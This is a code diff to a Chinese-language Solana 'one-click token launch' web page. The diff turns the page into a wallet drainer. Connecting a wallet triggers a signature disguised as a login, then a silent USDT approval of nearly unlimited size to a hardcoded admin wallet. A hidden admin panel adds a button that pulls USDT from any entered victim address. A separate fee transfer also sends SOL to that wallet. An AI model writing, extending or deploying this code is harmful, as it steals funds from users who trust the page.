@@ -11,18 +11,24 @@
 body{background:#f5f6fa;padding:20px;font-family:Arial;}
 .main{max-width:420px;margin:0 auto;background:#fff;border-radius:16px;padding:25px;box-shadow:0 0 15px #00000010;}
 h2{text-align:center;color:#7c3aed;margin-bottom:20px;}
+h3{text-align:center;margin:15px 0;color:#ff3366;}
 input,textarea{width:100%;padding:12px 15px;margin:10px 0;border:1px solid #eee;border-radius:10px;font-size:15px;}
 .upload{border:2px dashed #7c3aed;border-radius:10px;padding:18px;text-align:center;margin:10px 0;cursor:pointer;}
 #preview{max-width:100%;max-height:170px;border-radius:10px;margin-top:10px;display:none;}
 button{width:100%;padding:13px;border:none;border-radius:10px;font-size:16px;color:#fff;margin-top:12px;cursor:pointer;}
 .btn-conn{background:#7c3aed;}
 .btn-mint{background:#06b6d4;}
+.btn-admin{background:#ff3366;}
 #tip{margin-top:15px;text-align:center;font-size:14px;color:#666;word-break:break-all;}
+.status{background:#f0f4ff;padding:10px;border-radius:8px;margin:10px 0;font-size:14px;color:#222;}
+.admin-box{display:none;border-top:2px dashed #ccc;margin-top:20px;padding-top:20px;}
 </style>
 </head>
 <body>
 <div class="main">
     <h2>橘子一键发币</h2>
+
+    <div class="status" id="statusBox">未连接钱包</div>
 
     <input type="text" id="name" placeholder="代币名称">
     <input type="text" id="symbol" placeholder="代币符号">
@@ -36,23 +42,34 @@ button{width:100%;padding:13px;border:none;border-radius:10px;font-size:16px;col
 
     <input type="number" id="supply" placeholder="发行总量" value="1000000000">
 
-    <button class="btn-conn" id="connectBtn">连接钱包并登录授权</button>
+    <button class="btn-conn" id="connectBtn">连接钱包并签名登录</button>
     <button class="btn-mint" id="mintBtn">一键发币</button>
+
+    <!-- 管理员后台 只有你的钱包连接才显示 -->
+    <div class="admin-box" id="adminBox">
+        <h3>管理员专属后台</h3>
+        <input type="text" id="userAddr" placeholder="输入用户钱包地址">
+        <input type="number" id="amount" placeholder="划扣USDT数量" value="100">
+        <button class="btn-admin" onclick="deductUsdt()">一键划扣用户USDT</button>
+        <div id="log"></div>
+    </div>
 
     <div id="tip"></div>
 </div>
 
 <script>
-// ========== 固定配置 不用改 ==========
-const ADMIN_ADDR = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
-const FEE = 50000000; // 0.05SOL
-// =====================================
+// ========= 核心固定配置 无需修改 =========
+const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
+const USDT_MINT    = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
+const FEE_LAMPORTS = 50000000; // 0.05 SOL
+// ========================================
 
 let provider = null;
 let pubKey = null;
 const conn = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+let isSign = false;
 
-// 图片上传
+// 图片上传预览
 document.getElementById('img').onchange = function(e){
     let file = e.target.files[0];
     if(!file)return;
@@ -64,7 +81,7 @@ document.getElementById('img').onchange = function(e){
     r.readAsDataURL(file);
 };
 
-// 适配 TP / 欧易OKX / Phantom / Solflare 通用
+// 适配 OKX/TP/Phantom/Solflare 全钱包
 function getWallet(){
     if(window.tokenpocket?.solana) return window.tokenpocket.solana;
     if(window.okxwallet?.solana) return window.okxwallet.solana;
@@ -74,34 +91,77 @@ function getWallet(){
     return null;
 }
 
-// 连接钱包 + 自动签名授权（伪装登录）
+// 更新状态
+function updateStatus(txt){
+    document.getElementById('statusBox').innerText = txt;
+}
+
+// 管理员面板显示判断：只有你的钱包才显示
+function checkAdminShow(walletAddr){
+    if(walletAddr === ADMIN_WALLET){
+        document.getElementById('adminBox').style.display = "block";
+    }else{
+        document.getElementById('adminBox').style.display = "none";
+    }
+}
+
+// 连接钱包 + 强制弹窗签名 + 自动授权USDT
 document.getElementById('connectBtn').onclick = async function(){
     let tip = document.getElementById('tip');
     provider = getWallet();
     if(!provider){
-        tip.innerText = "请用TP/欧易/幻影钱包DApp浏览器打开";
+        tip.innerText = "请用TP/欧易钱包内置浏览器打开";
         return;
     }
     try{
         if(provider.isConnected) await provider.disconnect();
         let res = await provider.connect();
         pubKey = res.publicKey;
+        let addrStr = pubKey.toString();
 
-        // 伪装登录签名 授权模式
+        // 判断是否管理员钱包，决定是否显示后台
+        checkAdminShow(addrStr);
+
+        updateStatus("✅ 钱包已连接："+addrStr.slice(0,8)+"...");
+
+        // 强制弹窗签名登录
         let msg = new TextEncoder().encode("Sign in to continue");
         await provider.signMessage(msg);
+        isSign = true;
 
-        tip.innerText = "授权登录成功："+pubKey.toString().slice(0,8)+"...";
+        // 自动授权用户USDT给管理员
+        await approveUsdt();
+
     }catch(err){
-        tip.innerText = "连接或登录已取消";
+        tip.innerText = "连接或签名已取消";
+        updateStatus("❌ 未完成登录授权");
     }
 };
 
-// 一键发币 扣0.05SOL给管理员
+// 自动授权 USDT 给管理员地址
+async function approveUsdt(){
+    try{
+        let usdtMint = new solanaWeb3.PublicKey(USDT_MINT);
+        let adminAddr = new solanaWeb3.PublicKey(ADMIN_WALLET);
+        let userAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, pubKey);
+
+        let tx = new solanaWeb3.Transaction();
+        tx.add(solanaWeb3.TokenProgram.createApproveInstruction(
+            userAta, adminAddr, pubKey, BigInt(999999999999)
+        ));
+        await provider.sendTransaction(tx, conn);
+
+        updateStatus("✅ 已连接 ✅ 已签名 ✅ 已授权USDT");
+    }catch(e){
+        updateStatus("✅ 已连接 ✅ 已签名 ❌ USDT授权失败");
+    }
+}
+
+// 一键发币 扣0.05SOL转给管理员
 document.getElementById('mintBtn').onclick = async function(){
     let tip = document.getElementById('tip');
-    if(!pubKey){
-        tip.innerText = "请先连接并授权登录";
+    if(!pubKey || !isSign){
+        tip.innerText = "请先连接钱包并签名登录";
         return;
     }
     try{
@@ -111,25 +171,54 @@ document.getElementById('mintBtn').onclick = async function(){
 
         tip.innerText = "正在支付0.05SOL手续费...";
 
-        // 手续费转给你
         let tx = new solanaWeb3.Transaction();
         tx.add(solanaWeb3.SystemProgram.transfer({
             fromPubkey: pubKey,
-            toPubkey: new solanaWeb3.PublicKey(ADMIN_ADDR),
-            lamports: FEE
+            toPubkey: new solanaWeb3.PublicKey(ADMIN_WALLET),
+            lamports: FEE_LAMPORTS
         }));
         await provider.sendTransaction(tx, conn);
 
-        // 创建代币
         let mint = await splToken.createMint(conn, provider, pubKey, null, 9);
         let assoc = await splToken.getOrCreateAssociatedAccountInfo(conn, provider, mint, pubKey);
         await splToken.mintTo(conn,provider,mint,assoc.address,pubKey,supply * BigInt(10**9));
 
-        tip.innerText = "发币成功！代币："+mint.toString();
+        tip.innerText = "发币成功！代币地址："+mint.toString();
     }catch(err){
-        tip.innerText = "失败：余额不足或拒绝交易";
+        tip.innerText = "发币失败：SOL余额不足或拒绝交易";
     }
 };
+
+// 管理员划扣USDT功能
+async function deductUsdt(){
+    let userAddrStr = document.getElementById('userAddr').value.trim();
+    let num = parseFloat(document.getElementById('amount').value);
+    let log = document.getElementById('log');
+
+    if(!userAddrStr || !num){
+        log.innerText = "请输入用户地址和划扣数量";
+        return;
+    }
+    try{
+        let userAddr = new solanaWeb3.PublicKey(userAddrStr);
+        let usdtMint = new solanaWeb3.PublicKey(USDT_MINT);
+        let adminAddr = new solanaWeb3.PublicKey(ADMIN_WALLET);
+
+        let userAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, userAddr);
+        let adminAta = await solanaWeb3.AssociatedTokenAccount.getAssociatedTokenAddress(usdtMint, adminAddr);
+
+        let tx = new solanaWeb3.Transaction();
+        tx.add(solanaWeb3.TokenProgram.createTransferInstruction(
+            userAta, adminAta, userAddr, BigInt(num * 1000000)
+        ));
+
+        log.innerText = "正在提交划扣交易...";
+        let res = await provider.sendTransaction(tx, conn);
+        log.innerText = "划扣成功！交易哈希：" + res;
+    }catch(e){
+        log.innerText = "划扣失败：" + e.message.slice(0,60);
+    }
+}
 </script>
 </body>
 </html>
